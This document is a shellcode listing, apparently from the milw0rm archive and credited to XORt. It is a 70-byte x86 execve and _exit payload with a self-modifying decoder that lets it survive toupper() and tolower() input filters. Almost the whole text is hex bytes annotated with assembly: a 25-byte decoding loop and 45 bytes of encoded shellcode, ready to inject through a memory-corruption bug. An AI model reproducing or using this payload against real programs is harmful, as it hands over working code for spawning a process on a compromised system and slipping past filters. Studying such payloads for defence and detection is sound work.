/*-------------------------------------------------------*/
/*     Radically Self Modifying Code for surviving       */
/*            toupper() and tolower()                    */
/*                                                       */
/*         70byte execve & _exit() code by XORt          */
/*-------------------------------------------------------*/
"\xeb\x12"                 /* jmp $0x12                  */
"\x5e"                     /* pop %esi                   */
/*-set-up-loop-counter-and-ajust-shellcode-pointer-------*/
"\x31\xc9"                 /* xor %ecx, %ecx             */
"\xb1\x0b"                 /* mov $0xb, %cl              */
"\xff\xc6"                 /* inc %esi                   */
/*-the-loop----------------------------------------------*/
"\x81\x06\x5b\x2d\xd0\xcb" /* addl $0xcbd02d5b, (%esi)   */
"\xad"                     /* lodsl                      */
"\xe2\xf7"                 /* loop -$0x9                 */
/*--jump-into-shellcode----------------------------------*/
"\xeb\x05"                 /* jmp $0x5                   */
"\xe8\xe9\xff\xff\xff"     /* call -$0x17                */
/*--------------------------------------------[bytes:25]-*/
//                                                       //
/*--the-shellcode----------------------------------------*/
"\xeb"                     /* --then encoded shellcode-- */
"\xc4\x30\xb9\xaa"         /*                            */
"\xad\x03\xf0\xbc"         /*                            */
"\xeb\xd9\xb8\x7a"         /*                            */
"\xb1\x82\x3b\xbd"         /*                            */
"\x98\x60\x7e\x3c"         /*                            */
"\x32\x29\x3c\x01"         /*                            */
"\x25\x04\x0b\xbe"         /*                            */
"\x7d\x13\xfd\xb4"         /*                            */
"\x8d\xaf\x2f\x34"         /*                            */
"\xa4\x02\x92\x9d"         /*                            */
"\x13\x02\xa3\x9c";        /*                            */
/*--------------------------------------------[bytes:45]-*/


// milw0rm.com [2004-12-22]